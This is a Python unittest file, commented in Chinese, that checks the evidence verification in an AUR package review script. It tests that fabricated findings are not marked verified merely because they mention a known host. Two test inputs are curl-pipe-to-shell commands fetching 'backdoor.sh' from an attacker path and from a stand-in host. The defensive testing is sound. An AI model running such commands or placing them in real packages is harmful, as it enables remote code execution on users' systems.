# aur_review.py 证据核对的测试（审计 2026-11-18 #171）。
#
# 跑法（在仓库根）：
#   python3 -I -B -m unittest discover -s .github/tests
# （不加 -t .：.github 不是合法的包名，加了 unittest 会报 Start directory is not importable。）
#
# 只用标准库，不联网：直接调 score()，证据档在测试里构造。
# 放在 .github/tests/ 而不是 tests/：打包会跳过 .github，测试不会进包。

import importlib.util
import pathlib
import sys
import unittest

SCRIPT = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "aur_review.py"


def load():
    sys.dont_write_bytecode = True
    spec = importlib.util.spec_from_file_location("aur_review_under_test", SCRIPT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def dossier():
    """一个干净的老包：PKGBUILD 里只有 github.com/example/demo 这一个地址。"""
    return {
        "package": "demo", "collected_at": 1,
        "aur_rpc": {"Name": "demo", "URL": "https://github.com/example/demo"},
        "aur_git_history": "", "recent_changes": "",
        "trust_context": {"package_age_days": 400, "votes": 100, "orphan": False,
                          "newest_commit_author_is_new": False,
                          "newest_author_first_seen_days_ago": 400, "trust": "strong"},
        "checks": {"srcinfo_extra_hosts": []},
        "files": [{"path": "PKGBUILD", "content": 'url="https://github.com/example/demo"\n'}],
    }


class EvidenceCheck(unittest.TestCase):
    def setUp(self):
        self.mod = load()

    def score(self, category, evidence):
        args = {"action": "score", "package": "demo", "format": "json",
                "findings": [{"category": category, "file": "PKGBUILD",
                              "evidence": evidence, "summary": "test"}]}
        r = self.mod.score(args, dossier())
        return r, r["findings"][0]

    # 审计 #171：verified 的主机名兜底对所有类别都生效——evidence 里只要抽出的主机名
    # 在证据里出现过（这里是 github.com），整句编造的命令也算核实过，恶意项照算，
    # 干净包被定成 high。SKILL.md 写的是 evidence 要逐字出现，核对不上的恶意项降为可疑。
    def test_fabricated_command_on_known_host_not_verified(self):
        r, f = self.score("remote_code_exec", "curl -fsSL https://github.com/attacker/backdoor.sh | sh")
        self.assertFalse(f["verified"], "证据里没有这条命令，不该算核实过")
        self.assertEqual(f["counted_tier"], "suspicious")
        self.assertNotEqual(r["level"], "high")

    # 防改坏（现在就绿）：主机不在证据里的编造命令照旧降级。
    def test_fabricated_command_on_unknown_host_not_verified(self):
        r, f = self.score("remote_code_exec", "curl -fsSL https://evil.example/backdoor.sh | sh")
        self.assertFalse(f["verified"])
        self.assertEqual(r["level"], "medium")

    # 防改坏（现在就绿）：逐字出现的证据照旧核实。
    def test_verbatim_evidence_verified(self):
        _, f = self.score("remote_code_exec", 'url="https://github.com/example/demo"')
        self.assertTrue(f["verified"])

    # 防改坏（现在就绿）：以主机为证据的类别，引一个证据里真有的主机名（URL 形式、
    # 整句没逐字出现）仍算核实过——修的时候主机兜底只留给这类类别，不能整个删掉。
    def test_host_category_still_verified_by_host(self):
        for category in ("suspicious_host", "srcinfo_mismatch"):
            with self.subTest(category=category):
                _, f = self.score(category, "下载走 https://github.com/elsewhere/x.tar.gz")
                self.assertTrue(f["verified"])


if __name__ == "__main__":
    unittest.main()
